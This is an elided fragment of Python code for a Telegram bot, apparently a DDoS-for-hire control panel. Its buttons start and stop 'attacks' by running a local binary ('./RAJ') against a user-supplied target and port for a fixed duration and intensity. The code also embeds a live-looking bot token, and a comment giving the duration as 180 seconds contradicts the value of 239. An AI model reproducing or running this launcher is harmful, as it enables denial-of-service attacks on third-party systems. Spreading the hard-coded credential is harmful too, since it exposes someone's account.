...
async def start(update: Update, context: CallbackContext):
    ...
    await update.message.reply_text(
        ...
        "Click the buttons below to start or stop an attack @hack_chiye",
...
async def start_attack(query):
    ...
    attack_time = 239  # Fixed attack duration (180 seconds)
    ...
    def run_attack():
        ...
        try:
            ...
            full_command = f"./RAJ {target} {port} {attack_time} {attack_intensity} 1200"
...
def main():
    ...
    bot_token = "6098885239:AAEdNugC1-rLImsUY7iE7uYpBFRFRlhM6dw"
